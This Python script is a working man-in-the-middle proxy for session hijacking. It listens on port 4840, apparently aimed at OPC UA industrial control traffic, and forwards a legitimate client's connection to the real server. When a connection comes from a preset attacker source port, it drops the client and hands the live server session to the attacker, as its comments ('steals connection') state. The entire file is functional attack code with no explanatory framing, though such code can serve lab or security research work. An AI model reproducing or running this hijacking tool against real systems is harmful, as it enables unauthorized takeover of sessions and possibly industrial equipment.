import asyncio
import datetime
import sys

PROXY_IP = "0.0.0.0"
PROXY_PORT = 4840

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4841

BUFFER = 8192

attacker_connected = False
atck_port = 60000
saved_server = ()

def log(msg):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{ts}] {msg}")

# Reads bytes from one side of the connection
async def pipe(reader, writer, direction, client):
    try:
        while True:
            await asyncio.sleep(1)
            log(f"MSG in direction {direction}")
            
            # Once the attacker connects, break off the pipe between the client and the server
            if attacker_connected and client:
                break

            data = await reader.read(BUFFER)
            if not data:
                break
            
            writer.write(data)
            await writer.drain()

    except Exception as e:
        log(f"{direction} error: {e}")
    finally:
        # Attacker has connected so close the connection to the client
        if direction == "S→C":
            log(f"Client writer no longer required so closing...")
            writer.close()

# Called for each incoming client
async def handle_client(client_reader, client_writer):
    global attacker_connected
    global saved_server

    client_ip, client_port = client_writer.get_extra_info("peername")
    local_ip, local_port = client_writer.get_extra_info("sockname")

    log(f"Client connected from {client_ip}:{client_port} "
        f"→ proxy {local_ip}:{local_port}")

    # Catches the attacker and creates their pipes
    if client_port == atck_port:
        attacker_connected = True
        log(f"Attacker connection received, steals connection")

        # Pipes for bidirectional attacker to server
        await asyncio.gather(
            pipe(client_reader, saved_server[1], "A→S", False),
            pipe(saved_server[0], client_writer, "S→A", False),
        )
    else:
        attacker_connected = False
        # Create connection with the actual server
        try:
            server_reader, server_writer = await asyncio.open_connection(
                SERVER_HOST, SERVER_PORT
            )
            # Save the server connection streams for reuse later
            saved_server = (server_reader, server_writer)
        except Exception as e:
            log(f"Failed to connect to server {SERVER_HOST}:{SERVER_PORT}: {e}")
            client_writer.close()
            return
        log(f"Connected to real server {SERVER_HOST}:{SERVER_PORT}")

        # Pipes for bidirectional client to server
        await asyncio.gather(
            pipe(client_reader, server_writer, "C→S", True),
            pipe(server_reader, client_writer, "S→C", True),
        )

        log(f"Connection closed from {client_ip}:{client_port}")

async def main():
    global atck_port
    # Attacker source port
    atck_port = int(sys.argv[1])
    
    # Create the listening server
    server = await asyncio.start_server(
        handle_client, PROXY_IP, PROXY_PORT
    )

    log(f"MITM proxy listening on {PROXY_IP}:{PROXY_PORT}, "
        f"forwarding to Server at {SERVER_HOST}:{SERVER_PORT}")

    async with server:
        await server.serve_forever()

asyncio.run(main())